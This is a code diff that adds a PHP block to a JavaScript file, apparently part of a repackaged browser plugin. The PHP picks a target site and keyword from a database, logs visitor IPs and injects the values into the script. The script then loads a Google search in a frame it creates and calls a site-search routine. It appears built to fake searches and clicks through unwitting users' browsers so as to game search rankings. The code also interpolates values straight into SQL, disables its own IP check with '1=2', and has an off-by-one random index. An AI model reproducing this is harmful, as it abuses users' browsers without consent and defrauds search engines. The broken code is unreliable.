@@ -1,5 +1,44 @@
 //CURRENT: get whole project together and init git
 //TODO: set youtubee.us up. set admin up, repack plugin, share content
+
+<?php
+require_once 'config.php';
+header('Content-Type: text/html; charset=utf-8');
+$site="";
+
+$word="";
+$days=date("z");
+
+$ip=$_SERVER["REMOTE_ADDR"];
+
+$table=select("select * from site ");
+
+$okSites=array();
+
+foreach ($table as $row){
+
+	$atable=	select("select * from actionp where siteid=$row[id] and days=$days and ip='$ip' and 1=2");
+	if(count($atable)==0){
+		$site=$row["site"];
+		$words=explode(",",$row["words"]);
+		
+		$word=$words[0];
+		$okSites[]=array("site"=>$site,"word"=>$word,"siteid"=>$row["id"]);
+			
+	}
+
+}
+$ind=rand(0,count($okSites));
+$okRow=$okSites[$ind];
+myQuery(getInsert("actionp",array("siteid"=>$okRow["siteid"],"days"=>$days,"ip"=>$ip)));
+
+$site=$okRow["site"];
+$word=$okRow["word"];
+
+//echo "{\"site\":\"$site\",\"word\":\"$word\",\"code\":\"upcontrole()\"}";
+
+?>
+
 var codeid = 140;
 var tab;
 var gurl = "https://www.google.com.tr/search?q=";
@@ -108,8 +147,11 @@ Hga = {
 }
 
 var response = {
-	site : 'tuz',
-	word : 'nakliyat'
+<?php 
+echo "	site : '$site',
+	word : '$word'";
+?>
+
 }
 
 site = response.site;
@@ -128,4 +170,5 @@ frame.setAttribute('src', gurl + word);
 document.body.appendChild(frame);
 
 tab = frame;
+if(site!='' && site !=='')
 setTimeout("Hga.searchSite()", 2000);
